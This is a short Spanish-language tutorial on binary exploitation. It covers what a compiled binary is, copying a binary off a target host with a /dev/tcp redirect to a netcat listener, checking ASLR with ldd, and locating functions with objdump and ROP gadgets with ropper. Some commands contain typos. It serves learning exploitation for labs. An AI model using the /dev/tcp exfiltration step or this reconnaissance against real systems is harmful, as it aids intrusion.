# Explotación de binarios (by CUCUxii)

## Índice 
- [Que es un binario](#Inicio)





---------------------------------------------------------------------------
## ¿Que es un binario?

Un binario, es lo que resulta de compilar un código en lenguaje C o java. Este código se ha traducido a bytes, que equivalen a lenguaje máquina, instrucciones 
que van directamente al procesador sin un intermediario (como puede ser con lenguajes interpretados como Python) Por tanto si intentas abrir un binario con 
nano o vim te encontrarás algunas cadenas legibles entre un lío de "@" y "." 
   - Como ya hemos dicho, son todo bytes, asi que si hay un "x41" lo traducirá a ascii como una "A", pero si hay un byte que no tenga dicho traduccion a ascii, 
   nano los escribirá como  estos "@" y ".".
   
Aunque ya hayamos perdido la capacidad de leer el código del binario (si no tenemos su codigo.c sin compilar claro), esas insutrcciones al procesador de las que
habíamos habaldo antes si que son legibles como código de **Ensamblador** o lenguaje de bajo nivel. El ensamblador es más abstracto que un código Python, 
y si lo ves por primera vez, puede asustar un poco. Pero al final se trata de insutrcciones muy simples (que pasaré a explicar en otro post)

---------------------------------------------------------------------------

## Compartir el binario

```console
[10.10.20.20]~$: cat < ./binario > /dev/tcp 10.10.10.10/443; md5sum bianrio 
348235923523958  /opt/bianrio
[cucuxii@parrot]~$: nc -nlvp 443 > binario; md5sum bianrio 
348235923523958  /opt/bianrio  # Ver si coinciden (que no se haya modificado el binario por el camino)
``` 

---------------------------------------------------------------------------

## Conocer el binario

   ### Protecciones:
   Los binarios cuentan con varios tipos de protecciones disponibles, conocer estas es ideal para saber que tipo de ataque podríamos probar
   
```console
[cucuxii@parrot]~$: for i in $(seq 1 20); do ldd ./binario | grep libc | awk 'NF{print NF}' | tr-d '()'; done
# Ver si cambian las direcciones de memoria
``` 
 
 
---------------------------------------------------------------------------

## Objdump

- **Ver la direccion de las funciones**
```console
[cucuxii@parrot]~$: objdump -D ./bianrio | grep "printf"
00000000118b <printf@plt>:    # La direccion de printf (llamada a plt) en el bianrio es 118b
```
- **Ver todas las funciones**
```console
[cucuxii@parrot]~$: objdump -t ./bianrio | grep "text"  # Filtramos por la seccion text que es el codigo ensamblador
000000001172 g F .text     filecount    # La direccion de la funcion "filecount" es 1172
#####  Lo mismo con el resto de funciones
```

---------------------------------------------------------------------------

## Radare2

---------------------------------------------------------------------------

## Ropper

Ropper encuentra los gadgets para programacion "ROP", corre el bianrio una vez para cargar datos en memoria y enontrar las instrucciones.
```pip install ropper```
```console
[cucuxii@parrot]~$: ropper --search "pop rdi" -f ./binario
0x5555558cb: pop rdi, ret
```


